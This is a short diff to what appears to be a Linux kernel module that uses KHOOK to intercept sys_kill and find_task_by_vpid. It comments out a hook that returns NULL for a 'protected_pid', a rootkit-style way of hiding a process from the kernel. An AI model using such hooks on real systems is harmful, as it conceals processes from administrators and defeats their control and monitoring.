@@ -240,7 +240,7 @@ static long khook_sys_kill(pid_t pid, int sig) {
 
 
 
-KHOOK(find_task_by_vpid);
+/*KHOOK(find_task_by_vpid);
 struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 {
 	struct task_struct *tsk = NULL;
@@ -249,7 +249,7 @@ struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 	printk("pid:%d", protected_pid);
 	if(protected_pid==vnr) tsk=NULL; 
 	return tsk;
-}
+}*/
 
 
 // KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
